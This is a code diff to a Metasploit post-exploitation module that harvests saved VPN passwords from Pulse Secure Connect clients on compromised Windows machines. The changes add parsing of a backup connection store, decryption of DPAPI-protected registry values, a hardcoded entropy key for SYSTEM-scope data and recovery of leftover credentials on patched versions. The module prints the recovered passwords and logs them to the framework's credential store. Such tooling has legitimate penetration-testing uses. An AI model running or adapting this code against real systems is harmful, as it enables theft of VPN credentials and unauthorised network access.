@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Post
 
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::UserProfiles
+  include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
 
   def initialize(info={})
@@ -37,6 +38,7 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_reg(data, entropy)
+    
     # decrypt value using CryptUnprotectData
     rg = session.railgun
     pid = session.sys.process.getpid
@@ -92,11 +94,15 @@ class MetasploitModule < Msf::Post
     
     connstore_paths = [
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.dat",
+      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.bak",
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.tmp"
     ]
     begin
       ives = {}
       connstore_paths.each do |path|
+        if not session.fs.file.exist?(path)
+          next
+        end
         connstore_data = session.fs.file.open(path).read.to_s
         matches = connstore_data.scan(/ive "([a-z0-9]*)" {.*?connection-source: "([^"]*)".*?friendly-name: "([^"]*)".*?uri: "([^"]*)".*?}/m)
         matches.each do |m|
@@ -112,15 +118,29 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def get_entropy(value)
+  def get_entropy_from_ive_index(ive_index)
+    return "IVE:#{ive_index.upcase}"
+  end
+
+  def cast_entropy(entropy)
     # we generate the CryptUnprotect entropy value from IVE key
-    seed = "IVE:#{value.upcase}"
-    seed_utf16 = []
-    seed.each_char do |c|
-      seed_utf16 << c.ord
-      seed_utf16 << 0
+    entropy_utf16 = []
+    entropy.each_char do |c|
+      entropy_utf16 << c.ord
+      entropy_utf16 << 0
     end
-    return seed_utf16.pack("c*")
+    return entropy_utf16.pack("c*")
+  end
+
+  def please_convert(my_str)
+   output = []
+   i = 0
+   while i < my_str.length - 2 do
+     a = my_str[i] + my_str[i+2]
+     output.append(a.hex)
+     i = i + 4
+   end
+   return output.pack("c*")
   end
 
   def get_creds
@@ -132,22 +152,59 @@ class MetasploitModule < Msf::Post
     ives = get_ives
     # for each user profile, we check for potential connection ive
     profiles.each do |profile|
-      keys = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
-      if keys
-        ives.each do |key, value|
-          reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{key}"
-          entropy = get_entropy(key)
-          # We get the encrypted password value from registry
-          vals = registry_enumvals(reg_path, "")
-          if vals
-            vals.each do |val|
-              data = registry_getvaldata(reg_path, val)
-              decrypted = decrypt_reg(data, entropy)
-              if decrypted != ""
-                ives[key]['username'] = nil
-                ives[key]['password'] = decrypted.remove("\x00")
-                creds << ives[key]
+      key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
+      Array(key_names).each do |key_name|
+        ive_index = key_name[4..-1] # remove 'ive:'
+          
+        # We get the encrypted password value from registry
+        reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
+        vals = registry_enumvals(reg_path, "")
+        
+        if vals
+          vals.each do |val|
+            data = registry_getvaldata(reg_path, val)
+            if is_system?
+              if not data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
+                next
+              else
+                # this means data was encrypted by elevated user using LocalSystem scope and fixed
+                # pOptionalEntropy value, adjusting parameters
+                data = please_convert(data[18..-4]) # get rid of '{capi} 1,' and trailing null bytes
+                entropy = ["7B4C6492B77164BF81AB80EF044F01CE"].pack("H*")
               end
+            else
+              # convert IVE index to DPAPI pOptionalEntropy value like PSC does
+              entropy = cast_entropy(get_entropy_from_ive_index(ive_index))
+            end
+
+            # it's not DPAPI data
+            if not data.starts_with?("\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8Cz\x00\xC0O\xC2\x97\xEB")
+              next
+            end
+           
+            decrypted = decrypt_reg(data, entropy)
+            if decrypted != ""
+              if not ives.key?(ive_index)
+                # If the ive_index is not in gathered IVEs, this means it's a leftover from
+                # previously installed Pulse Secure Connect client versions.
+                #
+                # IVE keys of existing connections can get removed from connstore.dat and connstore.tmp
+                # when the new version is executed and that the client has more than one defined connection,
+                # leading to them not being inserted in the 'ives' array.
+                #
+                # However, the registry values are not wiped when Pulse Secure Connect is upgraded
+                # to a new version (including versions that fix CVE-2020-8956).
+                #
+                # TL;DR; We can still decrypt the password, but we're missing the URI and friendly
+                # name of that connection.
+                ives[ive_index] = {}
+                ives[ive_index]["connection-source"] = 'user'
+                ives[ive_index]["friendly-name"] = 'unknown'
+                ives[ive_index]["uri"] = 'unknown'
+              end
+              ives[ive_index]['username'] = nil
+              ives[ive_index]['password'] = decrypted.remove("\x00")
+              creds << ives[ive_index]
             end
           end
         end
@@ -158,65 +215,76 @@ class MetasploitModule < Msf::Post
 
   def vuln_builds
      [
-       [Gem::Version.new('0.0.0'), Gem::Version.new('9.0.4')],
-       [Gem::Version.new('9.1.0'), Gem::Version.new('9.1.3')],
+       [Gem::Version.new('0.0.0'), Gem::Version.new('9.0.5')],
+       [Gem::Version.new('9.1.0'), Gem::Version.new('9.1.4')],
      ]
+  end
+
+  def gather_creds
+    creds = get_creds
+    if creds.any?
+      creds.each do |cred|
+        print_good("Account Found:")
+        print_status("     Username: #{cred['username']}")
+        print_status("     Password: #{cred['password']}")
+        print_status("     URI: #{cred['uri']}")
+        print_status("     Name: #{cred['friendly-name']}")
+        print_status("     Source: #{cred['connection-source']}")
+
+        uri = URI(cred['uri'])
+        begin
+          address = Rex::Socket.getaddress(uri.host)
+        rescue SocketError
+          address = nil
+        end
+        service_data = {
+          address: address,
+          port: uri.port,
+          protocol: "tcp",
+          realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+          realm_value: uri.path,
+          service_name: "Pulse Secure SSL VPN",
+          workspace_id: myworkspace_id
+        }
+
+        credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          username: nil,
+          private_data: cred['password'],
+          private_type: :password
+        }
+
+        credential_core = create_credential(credential_data.merge(service_data))
+
+        login_data = {
+          core: credential_core,
+          access_level: "User",
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        create_credential_login(login_data.merge(service_data))
+      end
+    else
+      print_error "No users with configs found. Exiting"
+    end
   end
 
   def run
     build = get_build
     if vuln_builds.any? { |build_range| Gem::Version.new(build).between?(*build_range) }
-      print_status("Target is running Pulse Secure Connect build #{build} (vulnerable).")
-      creds = get_creds
-      if creds.any?
-        creds.each do |cred|
-          print_good("Account Found:")
-          print_status("     Username: #{cred['username']}")
-          print_status("     Password: #{cred['password']}")
-          print_status("     URI: #{cred['uri']}")
-          print_status("     Name: #{cred['friendly-name']}")
-          print_status("     Source: #{cred['connection-source']}")
-
-          uri = URI(cred['uri'])
-          service_data = {
-            address: Rex::Socket.getaddress(uri.host),
-            port: uri.port,
-            protocol: "tcp",
-            realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-            realm_value: uri.path,
-            service_name: "Pulse Secure SSL VPN",
-            workspace_id: myworkspace_id
-          }
-
-          credential_data = {
-            origin_type: :session,
-            session_id: session_db_id,
-            post_reference_name: self.refname,
-            username: nil,
-            private_data: cred['password'],
-            private_type: :password
-          }
-
-          credential_core = create_credential(credential_data.merge(service_data))
-
-          login_data = {
-            core: credential_core,
-            access_level: "User",
-            status: Metasploit::Model::Login::Status::UNTRIED
-          }
-
-          create_credential_login(login_data.merge(service_data))
-        end
-      else
-        print_error "No users with configs found. Exiting"
-      end
+      print_status("Target is running Pulse Secure Connect build #{build}.")
+      print_status("This version is considered vulnerable. Running credentials acquisition.")
+      gather_creds
     else
-      print_status("Target is running Pulse Secure Connect build #{build} (not vulnerable).")
-      #Even if the target is running a safe build, data saved in the registry by previous versions of Pulse Secure
-      #is not wiped out during newer versions installation. This means we can still recover that data, minus the connection
-      #details (server url, connection name, etc).
-      #
-      #On top of that, we can still recover full details if executing within an elevated process (SYSTEM).
+      print_status("Target is running Pulse Secure Connect build #{build}.")
+      print_status("This version is considered safe, but there might be leftovers from connections defined by previous versions of Pulse Secure Connect in the registry.")
+      print_status("Running credentials acquisition.")
+      gather_creds
+      if not is_system?
+        print_status("We recommend running this script in elevated mode to obtain credentials saved by recent versions.")
+      end
     end
   end
 end
